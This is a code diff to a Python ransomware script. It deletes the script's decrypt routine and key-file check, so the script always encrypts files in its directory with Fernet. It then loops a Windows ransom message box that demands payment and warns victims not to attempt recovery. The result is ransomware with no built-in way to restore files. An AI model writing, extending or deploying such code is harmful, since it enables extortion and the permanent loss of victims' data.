@@ -47,39 +47,6 @@ def encrypt():
         with open(file, "wb") as cur_file:
             cur_file.write(contents_encrypted)
 
-def decrypt():
-    files = []
-    print("file:", __file__)
-
-    for file in os.listdir():
-        if file == "stuff.py":
-            continue
-        if file == "key.key":
-            continue
-        if os.path.isfile(file):
-            files.append(file)
-    print(files)
-
-    with open("key.key", "rb") as key:
-        secretkey = key.read()
-
-    password = "Tablecloth"
-
-    user_password = input("Enter the password to get your files back:\n")
-
-    if user_password.lower() == password.lower():
-        for file in files:
-            with open(file, "rb") as cur_file:
-                contents = cur_file.read()
-            contents_decrypted = Fernet(secretkey).decrypt(contents)
-            with open(file, "wb") as cur_file:
-                cur_file.write(contents_decrypted)
-        print("Your files are back!")
-        input()
-        os.remove(f"{run_dir}\key.key")
-    else:
-        print("That's the wrong password")
-        input()
 
 # /Defs
 
@@ -88,25 +55,13 @@ def decrypt():
 desc = f"""
 This is important! You're computer just ran what's called a ransomware.
 
-Some or all of your files in {run_dir} have been locked and you need a special key to unlock them.
+Some or all of your files in {run_dir} have been locked and you need a special program to unlock them.
+Do not try to unlock the files by yourself, or they may be broken forever.
 
 You will recive the password for this once you {payment_note}
 """
 
-
-import ctypes  # An included library with Python install.   
-ctypes.windll.user32.MessageBoxW(0, desc, title, 0)
-
-decrypt_time = False
-       
-for file in os.listdir():
-    if file == "key.key":
-        print(" -- key found! --")
-        decrypt_time = True
-    
-if decrypt_time == True:
-    print("Decryption mode activated")
-    decrypt()
-else:
-    print("Encryption mode enabled")
-    encrypt()
+encrypt()
+while True:
+    import ctypes  # An included library with Python install.   
+    ctypes.windll.user32.MessageBoxW(0, desc, title, 0)
